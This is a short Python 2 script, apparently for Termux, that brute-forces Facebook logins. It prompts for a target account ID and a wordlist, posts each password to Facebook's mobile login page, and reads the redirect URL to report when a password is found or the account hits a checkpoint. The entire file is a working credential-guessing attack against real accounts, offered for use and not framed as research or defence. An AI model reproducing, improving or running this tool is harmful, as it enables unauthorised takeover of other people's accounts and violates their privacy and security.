#!/usr/bin/python
"""
Athour: anonymous

"""
import requests
import os

os.system('pip2 install requests')
os.system('y')
os.system('pkg install figlet')
os.system('y')
os.system('clear')
os.system('figlet LITBE')
url ='https://mbasic.facebook.com/login.php'

akun = raw_input("enter your id target : ")
list = raw_input("enter your wordlist : ")
x = open(list,'r').readlines()
for line in x:
  password = line.strip()
  R=requests.post(url, data={'email':akun,'pass':password,'submit':'submit'})
  if 'checkpoint' in R.url:
    print 'account checkpoint',password
    break
  elif 'm_sess' in R.url or 'save_device' in R.url:
    print 'password found',password
    break
  else:
    print 'password not found',password
# finis
